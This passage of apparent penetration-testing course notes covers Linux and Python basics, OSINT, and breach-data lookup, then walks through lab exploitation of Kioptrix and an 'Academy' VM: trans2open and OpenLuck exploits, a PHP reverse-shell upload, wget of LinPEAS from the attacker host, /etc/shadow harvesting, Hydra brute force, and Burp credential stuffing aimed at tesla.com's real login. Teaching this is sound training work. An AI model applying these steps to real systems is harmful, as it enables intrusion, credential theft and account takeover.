  - Switch to root (requires root password, or `sudo su` from `kali`).

---

## #26. Networking Commands (Old & New)

### Traditional Commands

- `ifconfig`:
  - Shows IP addresses and network interfaces.
- `iwconfig`:
  - Shows wireless interfaces (e.g. `wlan0`).
- `ping IP`:
  - Send ICMP echo requests.
  - `Ctrl+C` to stop.
- `arp -a`:
  - Show ARP table: IP → MAC mappings.
- `netstat -ano`:
  - Show active network connections and listening ports.
- `route`:
  - Show routing table.

### New `ip` Command Suite

Heath notes that `ifconfig` is being deprecated in favor of `ip`:

- `ip a` or `ip addr`:
  - Replaces `ifconfig`.
- `ip n`:
  - Shows neighbors/ARP (similar to `arp -a`).
- `ip r`:
  - Shows routing table.

Both methods are acceptable, but the **industry is moving to `ip`**.

---

## #27. Installing Tools & Using GitHub

### Updating & Installing Packages

- Update and upgrade packages:
  - `sudo apt update`
  - `sudo apt upgrade`
- Example of installing `pip` (Python package manager):
  - `sudo apt install python-pip`
  - `sudo apt install python3-pip`

### Example: Installing `pimpmykali`

Heath introduces `PimpMyKali` script by **DeWalt**:

- Purpose:
  - Fixes various Kali issues for 2020.x+:
    - Go environment
    - Impacket
    - Root login enabling (optional)
    - Other tweaks
- Installation:
  1. `cd /opt`
  2. `git clone <pimpmykali repo URL>`
  3. `cd pimpmykali`
  4. `./pimpmykali.sh`
     - Choose option `0` for full run.

- Script options:
  - Can downgrade from Metasploit 6 to 5 if 6 is buggy.
  - Can enable root login for Kali if desired.
    - Heath recommends **staying with `sudo`** for beginners.
- Encourages:
  - Regarding root login prompt:
    - Choose `no` unless you know what you are doing.

### Installing `gedit`

- `gedit` is a GUI text editor Heath likes.
- In newer Kali versions, removed by default.
- Install:
  - `sudo apt install gedit`
- Alternate editors:
  - `mousepad` (GUI)
  - `nano` (terminal)
- Usage:
  - `gedit test.txt`
  - `mousepad test.txt`
  - `nano test.txt`

---

## #28. Viewing, Creating, Editing Files

### `echo` & Redirection

- `echo "hello"` prints `hello`.
- Redirect to file:
  - Overwrite:
    - `echo "hey" > hey.txt`
  - Append:
    - `echo "hey again" >> hey.txt`

- Viewing file:
  - `cat hey.txt`

### `touch`

- `touch newfile.txt`:
  - Creates empty file (if not exist).
  - Updates timestamp (if exists).

### Using `nano`

- `nano file.txt`:
  - CLI editor.
  - Type content.
  - `Ctrl+X`, then:
    - `Y` to save.
    - Enter to confirm filename.

### Using `gedit` / GUI Editors

- `gedit file.txt`:
  - Opens GUI editor.
  - More convenient for selecting, copying, editing.

---

## #29. Example Bash Script – Ping Sweeper

Heath demonstrates how to build a **simple network ping sweeper** in bash:

### Concept

- Ping each IP in a subnet:
  - Example: `192.168.4.1 – 192.168.4.254`
- For each:
  - If host responds, print or store the IP.

### Steps

1. Manual ping test:
   - `ping -c 1 192.168.4.29` (active host).
   - `ping -c 1 192.168.4.41` (non-responsive).
2. Use `grep` to extract lines that show `64 bytes from ...`.
   - Example pipeline:
     - `ping -c 1 192.168.4.29 > ip.txt`
     - `cat ip.txt | grep "64 bytes"`
3. Use `cut` to extract the 4th field (IP address).
   - `cut -d ' ' -f 4`.
4. Use `tr -d ':'` to remove trailing colon.
5. Build a script:

   ```bash
   #!/bin/bash
   # ip-sweeper.sh
   # Usage: ./ipsweep.sh 192.168.4

   if [ "$1" == "" ]
   then
     echo "You forgot an IP address"
     echo "Syntax: ./ipsweep.sh 192.168.4"
   else
     for ip in $(seq 1 254); do
       ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
     done
   fi
   ```

- Make executable:
  - `chmod +x ipsweep.sh`
- Run:
  - `./ipsweep.sh 192.168.4 > ips.txt`
- Then use `ips.txt` as an IP list input for other tools (e.g. `nmap`).

### Example Multi-IP `nmap` Scan

- Use `for` loop to scan all IPs in `ips.txt`:

  ```bash
  for ip in $(cat ips.txt); do
    nmap $ip
  done
  ```

- Or more complex 1-liner loops.

---

## #30. Transition to Python Section

Heath introduces **Python module** next:

### Why Python?

- Python is:
  - A scripting and coding language.
  - Widely used in:
    - Ethical hacking
    - Automation
    - Security tooling
  - Considered one of the **best beginner languages**.
- Course will:
  - Cover basics:
    - Strings
    - Math
    - Functions
    - Conditionals
    - Loops
    - Data structures (lists, tuples, dictionaries)
  - Then:
    - Build tools:
      - E.g. Python port scanner.
    - Use Python in exploit development section:
      - Write custom exploits.

### Important Note

- You do **not** need to be a developer to be successful in pentesting.
- Goal of Python section:
  - Help you **read and understand code**.
  - Not necessarily to make you an expert programmer.
- Advice:
  - Take good notes.
  - Rewatch videos if necessary.
  - Use external resources if needed.

---

## #31. Python Basics (Highlights)

Heath walks through:

- Creating Python files in `~/python` directory.
- Shebang:
  - `#!/usr/bin/env python3` or `/usr/bin/python3`.
- Running:
  - `python3 script.py`
  - or `./script.py` if executable.

### Strings

- `print("Hello world")`
- Single and double quotes both work.
- Triple quotes for multi-line strings.

### String Concatenation

- `"This string " + "is awesome"`

### Escape Sequences

- `\n` for new line.
- Handling quotes with `\"` or single vs double quotes.

### Variables

- `quote = "All is fair in love and war"`
- `print(quote)`
- Methods:
  - `quote.upper()`
  - `quote.lower()`
  - `quote.title()`
  - `len(quote)`

### Numbers & Math

- Python as calculator:
  - `print(50 + 50)`
  - `print(50 - 50)`
  - `print(50 * 50)`
  - `print(50 / 50)`
- Exponents:
  - `50 ** 2`
- Modulo:
  - `50 % 6` → remainder 2
- Floor division:
  - `50 // 6` → 8

### Type Casting

- `int()`, `str()`, `float()`.

### Boolean Expressions

- `True`, `False`
- Comparisons:
  - `<`, `>`, `<=`, `>=`, `==`, `!=`
- Boolean operators:
  - `and`, `or`, `not`.

### Conditionals

- `if`, `elif`, `else`:

  ```python
  def drink(money):
      if money >= 2:
          return "You've got yourself a drink"
      else:
          return "No drink for you"
  ```

- Multiple conditions:

  ```python
  def alcohol(age, money):
      if age >= 21 and money >= 5:
          return "We're getting a drink"
      elif age >= 21 and money < 5:
          return "Come back with more money"
      elif age < 21 and money >= 5:
          return "Nice try kid"
      else:
          return "You're too poor and too young"
  ```

### Lists

- `movies = ["When Harry Met Sally", "The Hangover", "Perks of Being a Wallflower", "The Exorcist"]`
- Indexing:
  - `movies[0]` → first item
  - `movies[1:3]` → slice items
  - `movies[-1]` → last item
- Methods:
  - `len(movies)`
  - `movies.append("Jaws")`
  - `movies.pop()`
  - `movies.pop(0)`

### Tuples

- Like lists but immutable:
  - `grades = ('A', 'B', 'C', 'D', 'F')`
- Cannot be modified (no append, pop).

### Loops

- `for item in list:`
- `while condition:` loops until condition is false.

### Functions

- `def who_am_i():`
- Parameters and return:

  ```python
  def add(x, y):
      return x + y
  ```

### Dictionaries

- Key-value pairs:
  - `drinks = {'White Russian': 7, 'Old Fashioned': 10, 'Lemon Drop': 8}`
- Access:
  - `drinks['White Russian']` → 7
- Nested:
  - `employees = {'Finance': ['Bob','Linda','Tina'], 'IT':['Gene','Louise','Teddy'], 'HR':['Jimmy Jr','Mort']}`

---

## #32. Sockets & Python Port Scanner

### Sockets

- Purpose:
  - Connect two nodes.
  - Example: connect to open port on IP.

- Simple connection:

  ```python
  import socket

  host = '127.0.0.1'
  port = 7777

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  ```

- Used for:
  - Port scanning
  - Exploit development (sending payloads)

### Simple Python Port Scanner

- Using `socket` in loops:
  - Iterate over ports
  - Connect and check if open

---

## #33. Five Stages of Ethical Hacking

Heath recaps the **five stages**:

1. **Reconnaissance / Information Gathering**
   - Active vs Passive
     - Passive: OSINT, searching Google, LinkedIn, Twitter, etc.
     - Active: direct interactions with target (e.g. scanning).
2. **Scanning & Enumeration**
   - Tools like:
     - Nmap
     - Nessus
     - Nikto
   - Identifying:
     - Open ports
     - Services
     - Versions
     - Potential vulnerabilities
   - Enumeration:
     - Digging deeper into discovered services.
3. **Gaining Access (Exploitation)**
   - Running exploits against:
     - Web apps
     - Network services
     - OS vulnerabilities
   - Obtaining shell or privileged access.
4. **Maintaining Access**
   - Persistence mechanisms:
     - Creating accounts
     - Backdoors
     - Scheduled tasks
   - Ensuring you don’t lose access once rebooted, etc.
5. **Covering Tracks**
   - For hackers:
     - Clearing logs
     - Removing malware
   - For ethical hackers:
     - **Clean up**:
       - Remove backdoors
       - Remove test accounts
       - Restore system to previous state.

- The methodology:
  - Same across:
    - Network pentests
    - Web app pentests
    - Other specialized engagements
  - Tools and specific techniques change; high-level process does not.

---

## #34. Information Gathering – Email OSINT & Breach Data

### Discovering Email Addresses

Heath shows tools and methods:

#### Hunter.io

- Website: `hunter.io`
- Use:
  - Search domain like `tesla.com`.
  - Hunter identifies:
    - Email pattern:
      - For Tesla: `firstinitiallastname@tesla.com`
    - Known email addresses:
      - Titles, names, etc.
- Requires:
  - Sign-up
  - Limited number of free searches per month
- For lesser known domains like TCM Security:
  - Fewer results (maybe only `info@tcm-sec.com`).

#### Phonebook.cz

- Website: `phonebook.cz`
- Use:
  - Search email addresses by domain (e.g. `@tesla.com`).
  - Phonebook returns:
    - Many addresses:
      - `elon@tesla.com`
      - `emusk@tesla.com`
      - etc.
  - Useful for:
    - Building large username lists (for spraying).
- Can export as CSV.

#### VoilaNorbert (and similar)

- Another email discovery tool (Heath mentions but doesn’t deeply demo).
- Concept: guess and verify email addresses.

#### Clearbit

- Requires Chrome extension:
  - Clearbit Connect
- Integrates with Gmail:
  - Can search companies and people.
- Example:
  - Search `TCM Security`:
    - Finds Heath’s email: `heath@tcm-sec.com`
    - Finds sales contact(s).
  - Search `Tesla`:
    - Filter by role (e.g. IT).
    - Find CIO, CISO, HR, etc.

#### Email Validation

- Tools:
  - `emailhippo.com`
  - `email-checker.net`
- Verify if email exists:
  - Input email address
  - Shows `OK` or `BAD`
- False positives possible but useful for:
  - Sales lead validation
  - Investigation without contacting target

#### Forgot Password Enumeration

- Example with Google account:
  - Enter `pleasedonthackmeplz` as Gmail.
  - If Google says “Welcome,” the username exists.
  - Using “Forgot password”:
    - It might show partially masked recovery email:
      - `h*****@tc*****.com`
    - This helps **link** multiple email accounts to the same person.

- Importance:
  - In investigations:
    - Link pseudonymous accounts to real identity.
  - In OSINT:
    - Chain information across different breaches/accounts.

---

### Breach Data – Dehashed & Breach-Parse

#### Dehashed.com

- Paid service (Heath notes 1 week costs ~$5, year ~$150).
- Allows searching by:
  - Email
  - Username
  - IP address
  - Name
  - Address
  - Phone
  - VIN
- Sources:
  - Massive compilation of breached data:
    - Adobe
    - Dropbox
    - LinkedIn
    - etc.

- Example search:
  - `@tesla.com`:
    - Shows entries:
      - `george@tesla.com` (shared data)
      - `bob@tesla.com` (Adobe breach with a hashed password)
- Approach:
  - Copy hashes and attempt to:
    - Identify them via `hashes.org`.
    - Crack them with `hashcat` or similar.
  - Look for reused passwords or password patterns.
  - Link same hash across multiple emails (tie personal & corporate emails).

- Emphasizes:
  - Don’t rely only on one site; methodology matters more than tools.

#### Breach-Parse (Heath’s Tool)

- GitHub: `github.com/hmaverickadams/breach-parse`
- Script:
  - Works with a specific large breach compilation (~44 GB uncompressed).
  - Takes:
    - Domain like `@tesla.com`
  - Produces:
    - `tesla-master.txt`: combined user:password pairs
    - `tesla-users.txt`: usernames only
    - `tesla-passwords.txt`: passwords only

- Example:
  - `tesla-master.txt`:
    - `shark@tesla.com: 907dade814`
    - Another entry with similar password (slightly changed).
  - Observations:
    - People reuse patterns:
      - E.g. base word with changing number or capitalization.
  - Use:
    - For credential stuffing.
    - For password spraying (e.g. `Fall2020!`, `Winter2020!`).

---

## #35. Web Information Gathering & Subdomain Enumeration

### Importance of Subdomains

- Single domain (e.g. `tesla.com`) may have **many subdomains**:
  - `dev.tesla.com`
  - `test.tesla.com`
  - `vpn.tesla.com`
  - `login.tesla.com`
  - etc.
- Many vulnerabilities reside in:
  - Test or staging instances
  - Forgotten subdomains
- Need to enumerate subdomains thoroughly.

### Tools

#### Sublist3r / SubLister

- Installed via `apt install sublist3r` or similar.
- Usage:
  - `sublist3r -d tesla.com`
- Queries:
  - Search engines (Google, Yahoo, Bing, Baidu, etc.)
  - Online APIs
- Returns:
  - List of discovered subdomains (some may be 4th level).

#### CRT.sh

- Website: `crt.sh`
- Uses:
  - TLS certificate transparency logs.
- Query:
  - `%tesla.com` or `%tesla.com` with wildcard.
- Returns:
  - Subdomains used in certificates:
    - `energysupport.tesla.com`
    - `gridlogic.energy.tesla.com`
    - `sso-dev.tesla.com`
    - etc.
- Useful for:
  - Discovering environment layout
  - Staging subdomains:
    - `dev`, `qa`, `stage`, `staging2`

#### Amass (OWASP Amass)

- Advanced subdomain enumeration tool written in Go.
- Aggregates:
  - Multiple data sources
  - Brute forcing
  - DNS resolvers
- Recommended challenge:
  - Install Amass.
  - Compare results vs Sublist3r.
  - Typically finds many more subdomains.

#### HTTP Probe (TomNomNom’s httpx/httpprobe)

- Tools that:
  - Take subdomain list
  - Check which respond with HTTP/S
  - Identify live hosts.

---

## #36. Fingerprinting Websites – BuiltWith, Wappalyzer, WhatWeb

### BuiltWith

- Website: `builtwith.com`
- Input: domain (e.g. `tesla.com`).
- Returns:
  - Technologies used:
    - Analytics (Google Analytics, etc.)
    - CRM (Salesforce)
    - Web server types
    - Programming languages
    - CMS (Drupal, WordPress, etc.)
    - Hosting providers/CDNs
- Useful for:
  - Identifying:
    - `PHP`
    - `Drupal 8`
    - `Ubuntu`, `Nginx`, etc.
  - Then searching for:
    - CVEs affecting those versions.

### Wappalyzer

- Browser extension (works on Firefox & Chrome).
- When visiting a site:
  - Shows:
    - CMS
    - Programming language
    - Web server
    - Frameworks
    - JS libraries
    - OS (if detectable)
- Example:
  - For Tesla:
    - Drupal CMS
    - PHP
  - For others:
    - jQuery version
    - Nginx version

### WhatWeb (Kali Tool)

- CLI tool: `whatweb https://tesla.com`
- Outputs:
  - HTTP headers
  - Server banner:
    - e.g. `Apache/2.4.7 (Ubuntu)`
  - Frameworks
  - Possibly `PHP 7.3.7` or `Drupal 8`.

- Importance:
  - Direct raw info can be used for:
    - CVE checks
    - Manual enumeration.

---

## #37. Burp Suite – Web Proxy Basics

### Burp Suite Community Edition

- Free version (used in this course).
- Start:
  - `burpsuite` in Kali
  - Create `Temporary Project`.
  - Use `Use Burp Defaults`.
- Uses:
  - Intercept and modify HTTP requests/responses.
  - Spidering, scanning (Pro only for active scanning).
  - Repeater, Intruder, etc.

### Setting Up Firefox Proxy

- Use `FoxyProxy` addon to configure:
  - HTTP Proxy: `127.0.0.1:8080`
- Use toggle to quickly:
  - Turn proxy ON/OFF.
- Steps:
  - When ON:
    - Browser traffic goes through Burp.
  - Turn intercept ON in Burp:
    - See each request, can `Forward` or `Drop`.

### Example Use

- Visit `tesla.com` with intercept ON.
- Capture GET requests.
- Send interesting ones to:
  - **Repeater**:
    - Modify method (GET → POST).
    - Send and see server response.
  - **Target** tab:
    - See site map of visited endpoints.
  - **Headers**:
    - Identify:
      - `Server: Apache/1.3.20 (Red Hat Linux)`
      - Unique headers.

---

## #38. Google Dorking / Google-Fu

### Why Google-Fu Matters

- Good Googling is an essential skill.
- Many questions can be answered faster by:
  - Quick Google search.
- Great pentesters:
  - Constantly search for:
    - Errors
    - Exploit code
    - Documentation.

### Search Operators

From Google’s own documentation and Heath’s examples:

- `site:tesla.com`
  - Limits results to that domain.
- `-www.tesla.com`:
  - Excludes main site; gets subdomains like:
    - `ir.tesla.com`, `shop.tesla.com`.
- `filetype:pdf site:tesla.com`
  - Finds all PDFs.
- `filetype:xlsx site:tesla.com`
  - Finds Excel files.
- `filetype:csv site:tesla.com`
- Use:
  - Find sensitive files:
    - Backups
    - Spreadsheets with data
- Emphasizes:
  - With large orgs like Tesla, may be too many files.
  - Better for small/medium companies.

- Advanced:
  - Combine search terms, use quotes, etc.

---

## #39. Social Media OSINT

### LinkedIn & Twitter

- Use LinkedIn to find:
  - Employees
  - Roles
  - Organizational structure
- Search for:
  - Images:
    - Badge photos
    - Desk setups
    - Screens with apps open.
- Example:
  - Found a photo of an intern at Tesla:
    - Badge partially visible.
    - Desks and environment visible.

### Importance for Physical / Social Engineering

- Badge pictures:
  - Help replicate valid badges for physical engagements.
- Desk/screens:
  - Reveal:
    - What software they use
    - Internal tools
    - Potential attack surfaces.

### OSINT for Technical Attacks

- Combine:
  - Employee names from LinkedIn
  - Domain patterns from Hunter.io
  - Breach data from Dehashed.
- Build:
  - Username list
  - Password guess patterns.

---

## #40. Nmap – Scanning & Enumeration (KeyoptRix Example)

Heath uses **Kioptrix Level 1** VM as a target.

### Finding Kioptrix IP

On Kali:

- Use `ifconfig` to find subnet (e.g. `192.168.57.0/24`).
- Use `netdiscover -r 192.168.57.0/24`:
  - Find IPs on the local network.
  - Identify Kioptrix by:
    - Its vendor MAC (VMware).
- Alternative:
  - Log into Kioptrix as user `john` with password `TwoCows2` (provided for convenience).
  - Ping something:
    - `ping 8.8.8.8`:
      - Echo replies show Kioptrix’s IP in output, e.g. `192.168.4.53`.

- Another alternative:
  - Use `arp-scan`:
    - `arp-scan -l`:
      - Show live IPs and MACs
      - Look for VMware vendor.

### Nmap Basic Scan Command

Heath uses:

```bash
nmap -T4 -A -p- <target-ip>
```

- `-T4`: Timing template, speed 4 (fast but not max).
- `-A`: Aggressive scan:
  - OS detection
  - Version detection (`-sV`)
  - Script scanning (`-sC`)
  - Traceroute
- `-p-`: Scan all 65535 ports (1–65535).

### Stealth Scanning

- Nmap uses:
  - `-sS` (TCP SYN scan) by default when run as root.
- SYN scan:
  - Sends `SYN`.
  - If gets `SYN-ACK`, knows port open.
  - Sends `RST` instead of `ACK` to avoid full connection.

- Stealthy in theory; now widely detected by IDS/IPS.

### Nmap Help & Strategies

- `nmap -h`:
  - Shows help.
- Strategies:
  - Start with `-sS -p-` and no `-A` for speed.
  - Then run targeted `-A` only on discovered open ports.

---

### Kioptrix Nmap Scan Output (Summarized)

Open ports include:

- `22/tcp` – SSH
- `80/tcp` – HTTP (Apache)
- `111/tcp` – rpcbind
- `139/tcp` – netbios-ssn (SMB)
- `443/tcp` – HTTPS (Apache with mod_ssl)
- `32768/tcp` – portmapper-related

Enumerated:

- Apache/1.3.20 on Red Hat Linux
- Mod_ssl/2.8.4
- OpenSSL/0.9.6b
- SMB:
  - Samba 2.2.1a
- Linux OS, kernel 2.4.x estimated.

---

## #41. Web Enumeration – Kioptrix

### Default Web Pages

- Visit:
  - `http://<ip>`:
    - Shows Apache default “Test Page”.
  - `https://<ip>`:
    - Shows SSL variant of default test page (insecure certificate).

- 404 error page:
  - Reveals:
    - Apache version: `Apache/1.3.20 (Unix)`
    - OpenSSL and mod_ssl versions.
    - Internal hostname: `kioptrix.level1`.

- These are **informational findings**:
  - Can be reported as:
    - Information disclosure
    - Poor hygiene (default pages left in place).

### Vulnerability Scanning with Nikto

- Run:
  - `nikto -h http://<ip>` (works better on HTTP than HTTPS in this case).
- Nikto checks:
  - Outdated software
  - Misconfigurations
  - Known vulnerabilities.
- Findings:
  - Apache 1.3.20 is outdated.
  - Mod_ssl 2.8.4 and OpenSSL 0.9.6b are outdated.
  - Indicates possible code execution vulnerabilities:
    - Example: `OpenLuck` mod_ssl exploit (remote buffer overflow).
- Nikto also does:
  - Light directory scanning (directory busting).

- Save nikto output to file:
  - `nikto -h http://<ip> -output nikto.txt`.

### Directory Busting with DirBuster

- GUI tool: `dirbuster`.
- Use:
  - Target URL: `http://<ip>:80/`.
  - Wordlist:
    - `usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` (or medium).
  - File extensions:
    - `.php`, `.txt`, `.zip`, etc.
- DirBuster results:
  - Found:
    - `icons/`
    - `manual/`
    - `usage/`
    - `test.php` etc.
- Visit `usage/`:
  - Could reveal `webalizer` stats:
    - Webalizer v2.01.
- Visit `mrtg/` (Multi Router Traffic Grapher):
  - Shows network graphs.

- Additional Info:
  - Webalizer v2.01 may itself have vulnerabilities.
  - MRTG and other tools give context about environment.

### Burp Suite Header Enumeration

- Use Burp to intercept a basic request.
- Inspect response headers:
  - `Server: Apache/1.3.20 (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b`.
- Another information disclosure vector.

---

## #42. SMB Enumeration – Kioptrix

### Nmap Output for SMB

- Shows SMB ports open:
  - 139 and 445.
- Some Nmap scripts pre-run with `-A`:
  - `smb-os-discovery`
  - `smb-security-mode`
  - etc.
- Output indicates:
  - Samba 2.2.1a.

### Metasploit SMB Version Detection

- `msfconsole`.
- `search smb`.
- Use:
  - `use auxiliary/scanner/smb/smb_version`.
- `set RHOST <target-ip>`.
- `run`.
- Confirms:
  - Samba 2.2.1a running.

### smbclient

- Attempt to connect to shares:

  ```bash
  smbclient -L //<ip> -N
  ```

- Lists:
  - `IPC$`
  - `ADMIN$`.
- Try:

  ```bash
  smbclient //<ip>/ADMIN$ -N
  ```

- Access denied.
- Try:

  ```bash
  smbclient //<ip>/IPC$ -N
  ```

- Might allow connection but:
  - `ls` shows no meaningful files or access.

- Conclude:
  - No immediately exploitable anonymous share.
  - Still have version information for future exploitation.

---

## #43. SSH Enumeration – Kioptrix

### Nmap Shows

- `22/tcp` open with `OpenSSH 2.9p2`.

### Manual Enumeration

- Attempt to connect:

  ```bash
  ssh 192.168.57.134
  ```

- Error due to outdated key exchange algorithms.
- Fix:

  ```bash
  ssh -oKexAlgorithms=+<algorithm> -c <cipher> <ip>
  ```

- You can negotiate older insecure ciphers temporarily.
- When connecting:
  - Get SSH banner with version.
- No default credentials available → nothing else to do.

---

## #44. Researching Exploits – OpenLuck & Samba Trans2Open

### Mod SSL/OpenSSL – OpenLuck Exploit

- From Nikto and Nmap:
  - Apache 1.3.20
  - mod_ssl 2.8.4
  - OpenSSL 0.9.6b

- Search:
  - `mod_ssl 2.8.4 exploit`
- Find:
  - Exploit-DB entry:
    - Apache mod_ssl < 2.8.7 OpenLuck remote overflow.
- Also see GitHub repo with improved/fixed OpenLuck exploit code.

- Notes:
  - Exploit uses return addresses for specific OS distributions.
  - Works on x86 Linux (Red Hat).
  - Local or remote root shell.

- Save references:
  - Document:
    - Ports affected (80, 443).
    - Exploit name: OpenLuck.
    - Version coverage: mod_ssl 2.8.7 and below.

### Samba 2.2.1a – Trans2Open Exploit

- From Nmap & Metasploit:
  - Samba 2.2.1a.
- Search:
  - `Samba 2.2.1a exploit`.
- Find:
  - Exploit-DB entries:
    - Samba 2.2.x remote buffer overflow (trans2open).
  - Rapid7 module:
    - `exploit/linux/samba/trans2open`.

- Rapid7 description:
  - Exploits Samba 2.2.0–2.2.8.
  - On x86 Linux.
  - Requires:
    - No-exec stack disabled.
    - Anonymous access to `IPC$`.

- Kioptrix:
  - We verified:
    - Anonymous `IPC$` login possible via `smbclient`.
- Document:
  - Exploit name: trans2open.
  - Module path: `exploit/linux/samba/trans2open`.

---

## #45. Exploiting Kioptrix – Metasploit (Samba)

### Using Trans2Open in Metasploit

- Launch:

  ```bash
  msfconsole
  search trans2open
  use exploit/linux/samba/trans2open
  ```

- Show options:
  - Set `RHOST` to Kioptrix IP.
- Run:

  ```bash
  set RHOST 192.168.57.134
  exploit
  ```

- Metasploit brute forces different return addresses.
- Once correct:
  - Spawns shell:
    - `whoami` → `root`.
    - `hostname` → `kioptrix.level1`.

- First successful **root shell** on Kioptrix via Samba remote buffer overflow.

---

## #46. Exploiting Kioptrix – Manual OpenLuck Exploit

### GitHub OpenLuck Version

- Clone repo:

  ```bash
  cd /opt
  git clone <OpenLuck repo URL>
  cd OpenLuck
  ```

- Install dependency:

  ```bash
  sudo apt install libssl-dev
  ```

- Compile:

  ```bash
  gcc -o open openssl-too-open.c -lcrypto
  ```

- Usage:

  ```bash
  ./open <offset> <ip> -c <count>
  ```

- Determine correct offset:
  - Based on OS:
    - Example: `0x6b` for Red Hat Apache 1.3.20.

- Example run:

  ```bash
  ./open 0x6b 192.168.57.134 -c 40
  ```

- Exploit:
  - Spawns shell (bash 2.05).
  - May auto-download additional files (wgets).
  - After a moment:
    - `whoami` → `root`.
    - `hostname` → `kioptrix.level1`.

- Now root gained manually via OpenLuck.

---

## #47. Post-Exploitation Basics on Linux

### Goals After Root

1. Identify network position & routes:
   - `ifconfig` or `ip a`
   - `route -n` or `ip r`
   - `arp -a`
   - Could see if dual-homed into other networks (pivoting possibility).
2. Privilege Inspection:
   - Already root on Kioptrix.
   - `sudo -l` would show nothing new; root can run anything.
3. Credential Harvesting:
   - `cat /etc/passwd`
   - `cat /etc/shadow`
     - Save `shadow` file for offline password cracking.
   - Check user home directories:
     - `ls /home`
     - `ls /home/<user>`
   - Look for:
     - Hidden files (`.ssh` keys, `.bash_history`, etc.).
4. Clean up after finishing:
   - Remove any uploaded tools.
   - Restore configuration if changed.

---

## #48. Brute Forcing SSH – Hydra & Metasploit

### Using Hydra

- Syntax:

  ```bash
  hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.57.134 -t 4 -vV
  ```

- `-l root`: login user root.
- `-P`: password list path.
- `ssh://...`: target service.
- `-t 4`: 4 threads.
- `-vV`: verbose output.

- Hydra tries:
  - `root` + each password from list.
- In Kioptrix:
  - Likely no success (password not weak enough).

### Using Metasploit `auxiliary/scanner/ssh/ssh_login`

- Steps:

  ```bash
  msfconsole
  use auxiliary/scanner/ssh/ssh_login
  set RHOSTS 192.168.57.134
  set USERNAME root
  set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
  set VERBOSE true
  set THREADS 10
  run
  ```

- Same logic:
  - Tries `root` with each password.
- If found:
  - Gets valid credentials.
- If not:
  - Confirm password is not in common wordlist.

---

## #49. Credential Stuffing & Password Spraying with Burp

Heath revisits credential stuffing in detail.

### Definitions

- **Credential Stuffing**:
  - Use known credential pairs from breaches:
    - `<email, password>` combos.
  - Test against login form.
- **Password Spraying**:
  - Use set of known or guessed passwords.
  - Spray them across many usernames.
  - E.g. `Summer2020!` attempted against 100 usernames.

### Example with Tesla Login

- Go to `tesla.com` → `Sign In`.
- Use Burp with `FoxyProxy`.
- Intercept one bogus login:
  - Email: `test@test.com`
  - Password: `test`.

#### Burp Intruder – Credential Stuffing

- Send intercepted request to **Intruder**.
- Positions:
  - Add markers around email.
  - Add markers around password.
- Attack type:
  - `Pitchfork` (1:1 mapping of username to password).
- Payloads:
  1. Set 1 (emails):
     - List of collected Tesla emails (`@tesla.com`).
  2. Set 2 (passwords):
     - Corresponding known passwords from breaches.

- Start attack.
- Filter results by:
  - Status code changes (e.g. 302 vs 401).
  - Length differences in response.
  - Body text differences:
    - e.g., `We could not sign you in` or lack of that phrase.
- Grep Matching:
  - Options → Grep – Match:
    - Add error message (`We could not sign you in`).
  - Requests that do **not** contain this error text may indicate successful logins.

#### Burp Intruder – Password Spraying

- Single payload position:
  - For email: set payload as username list.
  - For password: set static value like `Fall2019!`.
- Attack type:
  - `Sniper` or `Cluster Bomb` depending on config.
- Slowly test:
  - 1–2 attempts per user to avoid lockouts.
- Warnings:
  - In AD environments:
    - Wrong approach can cause:
      - Account lockouts
      - Denial of service for users.

---

## #50. Example Lab Machine – Academy (Linux PrivEsc & LFI)

Heath uses a custom **Academy** machine (Linux) for a full chain attack:

### Setup

- Import VM in VMware or VirtualBox.
- Login:
  - `root` / `tcm`.
- Get IP:
  - `dhclient` (if needed).
  - `ip a`.

### Nmap Scan

- Finds:
  - 21/tcp – FTP (vsftpd 3.0.3), allows anonymous login.
  - 22/tcp – SSH.
  - 80/tcp – HTTP (Apache2 test page).
  - Possibly others.

### FTP Enumeration

- `ftp <ip>`
- Login as `anonymous` / `anonymous`.
- `ls` reveals:
  - `note.txt`.
- Download:
  - `get note.txt`.
- Read `note.txt`:

  - Contains:
    - Message about someone named Grimmy.
    - Grimmy using the same password everywhere.
    - Inserted user via SQL command with fields:
      - `student_reg_no`
      - `student_photo`
      - `password`
      - `student_name`
      - `pin_code`.
    - Password field shows hashed value.

### Hash Identification & Cracking

- Use `hash-identifier`:
  - Paste hash, recognized as **MD5**.
- Save hash into `hashes.txt`.
- Use `hashcat`:

  ```bash
  hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
  ```

- `-m 0` = MD5.
- After cracking:
  - Get plaintext `student`.

### Web Application – Academy Portal

- Use directory busting:
  - `ffuf ...` or `dirb` to find `/academy` path.
- Visit:
  - `http://<ip>/academy`.
- Login:
  - Use `student_reg_no` from note as username.
  - Use cracked password `student`.
- If forced to change password:
  - Old: `student`
  - New: anything.

### Student Portal Enumeration

- Inside portal:
  - Enroll in courses
  - Profile management
  - Change password
  - Upload student photo.

#### File Upload Exploit

- `Upload Photo` feature under My Profile.
- Try uploading a `dog.jpg`:
  - Works.
- Examine where image is stored:
  - View image:
    - Looks like `/academy/student_photo/dog.jpg`.
- Plan:
  - Upload PHP reverse shell instead of photo.

- Use PentestMonkey PHP reverse shell:
  - Download script.
  - Modify:
    - IP = attacker IP.
    - Port = e.g. 4444.
- Host `php-reverse-shell.php` as file.
- Upload it using upload form.
- On server side, uploaded file is executable PHP.

- Set netcat listener:

  ```bash
  nc -nvlp 4444
  ```

- Trigger script:
  - Access `http://<ip>/academy/student_photo/php-reverse-shell.php`.
- Result:
  - Obtain shell as `www-data`.

### Linux Privilege Escalation – LinPEAS

- From shell:
  - `cd /tmp`.
  - Download LinPEAS:

    ```bash
    wget http://<kali-ip>/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

- LinPEAS output shows:
  - Interesting:
    - `/home/grimmy/backup.sh`.
    - MySQL credentials:
      - User: `grimmy`
      - Password: `myverysecurepass`.
- Examine `/home/grimmy/backup.sh`:

  ```bash
  #!/bin/bash
  rm /tmp/backup.zip
  zip /tmp/backup.zip /var/www/html/academy/includes/*
  chmod 777 /tmp/backup.zip
  ```

- Suggests:
  - Cron job or systemd timer periodically running `backup.sh` as root.

### Investigating Scheduled Execution – pspy

